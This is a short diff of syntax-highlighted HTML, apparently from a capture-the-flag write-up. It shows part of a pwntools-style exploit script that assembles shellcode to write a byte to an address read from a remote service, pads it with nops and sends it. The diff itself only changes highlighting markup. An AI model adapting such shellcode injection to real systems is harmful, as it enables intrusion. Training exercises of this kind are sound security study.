@@ -373,7 +373,7 @@ variable</span><span class="o"> =</span><span class="p"> shell.recvline().strip(
 shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="no">f</span><span class="s">"""
     mov byte ptr ds:</span><span class="p">{variable}</span><span class="s">, 0x43
     ret
-"""</span><span class="p">).ljust(9, asm("nop"))
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
 
 shell.sendline(shellcode)
 shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
